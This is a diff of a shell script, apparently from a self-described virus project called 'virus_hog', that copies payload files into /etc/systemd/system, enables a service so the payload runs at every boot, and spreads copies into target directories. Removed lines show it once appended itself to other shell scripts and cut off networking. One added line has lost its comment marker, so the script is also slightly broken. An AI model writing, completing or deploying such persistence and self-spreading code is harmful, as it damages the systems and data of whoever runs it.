@@ -12,29 +12,23 @@ if [ -z "$DIR" ]; then
 	DIR=$(find /media -name "virus_hog")
 fi
 
-# add virus where it will be called every time the computer boots
-if [ -f etc/systemd/system/script_daemon.service ]; then
-	cp $DIR/hog.sh etc/systemd/system/hog.sh
-	cp $DIR/hog etc/systemd/system/hog
-	cp $DIR/run.sh etc/systemd/system/run.sh
-	cp $DIR/add_to_system.service etc/systemd/system/script_daemon.service
+add virus where it will be called every time the computer boots
+if [ -f /etc/systemd/system/script_daemon.service ]; then
+	sudo cp $DIR/hog.sh /etc/systemd/system/hog.sh
+	sudo cp $DIR/hog /etc/systemd/system/hog
+	sudo cp $DIR/run.sh /etc/systemd/system/run.sh
+	sudo cp $DIR/add_to_system.service /etc/systemd/system/script_daemon.service
 	sudo systemctl daemon-reload
-	sudo systemctl enable etc/systemd/system/script_daemon.service
+	sudo systemctl enable /etc/systemd/system/script_daemon.service
 fi
 
 #echo "$PATH_TO_DAMAGE"
 for path in $PATH_TO_DAMAGE
 do
-	PATH_=$(dirname $path)
-	sudo cat $path hog.sh > $PATH_/_tmp_output
-	mv -f $PATH_/_tmp_output $path
+	PATH_=$(dirname $path) # get path of shell file
 	
-	echo $path = path
+	# echo $path = path
 	sudo cp -f $DIR/hog $PATH_/hog
 	sudo cp -f $DIR/run.sh $PATH_/run.sh
-	sudo cp -f $DIR/makefile $PATH_/makefile
+	sudo cp -f $DIR/hog.sh $PATH_/hog.sh
 done
-
-# disconnect wifi for no reason
-nmcli networking off
-
